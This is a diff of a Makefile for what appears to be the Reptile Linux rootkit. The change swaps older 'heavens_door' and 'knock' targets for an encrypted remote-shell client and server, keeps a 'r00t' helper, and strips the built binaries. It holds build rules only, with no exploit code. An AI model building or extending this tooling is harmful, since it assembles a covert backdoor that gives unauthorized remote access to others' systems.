@@ -1,9 +1,13 @@
 MODULE=reptile
+CLIENT_OBJ=pel.c aes.c sha1.c client.c
+SERVER_OBJ=pel.c aes.c sha1.c shell.c
 
 all:
-	gcc -Wall heavens_door.c -o $(MODULE)_heavens_door
+	gcc -O -W -Wall -o $(MODULE)_client  $(CLIENT_OBJ)
+	gcc -O -W -Wall -o $(MODULE)_shell $(SERVER_OBJ) -lutil -DLINUX
 	gcc -Wall r00t.c -o $(MODULE)_r00t
-	gcc -Wall knock.c -o $(MODULE)_knock
+	strip $(MODULE)*
 	cp $(MODULE)* ../bin
+
 clean:
-	rm -rf $(MODULE)*
+	rm -f $(MODULE)*
